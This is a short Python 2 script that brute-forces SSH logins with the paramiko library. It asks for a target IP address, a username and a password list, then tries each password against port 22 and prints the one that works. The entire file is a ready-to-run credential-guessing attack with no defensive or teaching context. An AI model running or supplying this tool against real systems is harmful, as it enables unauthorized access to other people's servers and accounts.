import paramiko
import sys
import os

# Get target details
target = str(raw_input('Please enter target IP address: '))
username = str(raw_input('Please enter username to bruteforce: '))
password_file = str(raw_input('Please enter location of the password file: '))

# Define function for SSH connection attempt
def ssh_connect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(target, port=22, username=username, password=password)
    except paramiko.AuthenticationException:
        code = 1  # Authentication failed
    except Exception as e:
        print("Error: {}".format(e))
        code = 2  # Other exceptions, e.g., connection issues
    finally:
        ssh.close()  # Ensure SSH connection is closed
    return code

# Open password file and attempt bruteforce
try:
    with open(password_file, 'r') as file:
        for line in file.readlines():
            password = line.strip()

            try:
                response = ssh_connect(password)

                if response == 0:
                    print('Password found: ' + password)
                    exit(0)  # Exit after finding the password
                elif response == 1: 
                    print('No luck with: ' + password)
            except Exception as e:
                print("Error during connection: {}".format(e))
except IOError:
    print("Error: Password file not found or cannot be read.")

